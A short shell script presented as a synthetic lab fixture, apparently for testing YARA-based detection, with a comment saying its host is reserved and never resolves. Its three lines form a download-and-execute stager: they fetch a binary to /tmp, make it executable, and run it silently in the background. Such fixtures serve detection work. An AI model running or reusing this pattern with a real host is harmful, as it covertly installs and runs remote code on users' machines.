#!/bin/sh
# yaraci lab fixture - synthetic and benign; the host name is reserved and never resolves
curl -fsSL https://updates.example.invalid/agent -o /tmp/agent
chmod +x /tmp/agent
nohup /tmp/agent >/dev/null 2>&1 &
